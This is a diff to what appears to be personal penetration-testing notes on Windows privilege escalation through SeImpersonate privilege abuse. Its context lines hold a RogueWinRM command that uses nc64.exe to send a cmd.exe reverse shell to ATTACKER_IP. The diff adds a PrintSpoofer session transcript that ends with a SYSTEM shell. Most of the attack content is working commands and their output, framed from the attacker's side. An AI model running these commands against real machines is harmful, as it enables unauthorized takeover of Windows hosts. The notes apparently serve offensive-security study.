@@ -781,7 +781,7 @@ The easiest way to gain access to another user is to gather credentials from a c
     These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.  
     As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.  
     <details>
-    <summary>DEMO</summary>
+    <summary>RogueWinRM.exe</summary>
 
     To elevate privileges using such accounts, an attacker needs the following:
      1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 
@@ -798,6 +798,23 @@ The easiest way to gain access to another user is to gather credentials from a c
      c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
      ```  
     </details>  
+
+    <details>
+    <summary>PrintSpoofer.exe</summmary>
+    ```
+    C:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
+    PrintSpoofer.exe -i -c cmd
+    [+] Found privilege: SeImpersonatePrivilege
+    [+] Named pipe listening...
+    [+] CreateProcessAsUser() OK
+    Microsoft Windows [Version 10.0.14393]
+    (c) 2016 Microsoft Corporation. All rights reserved.
+
+    C:\Windows\system32>whoami
+    whoami
+    nt authority\system
+    ```  
+    </details>
 
 ### Abusing vulnerable software  
 - Unpatched Software  
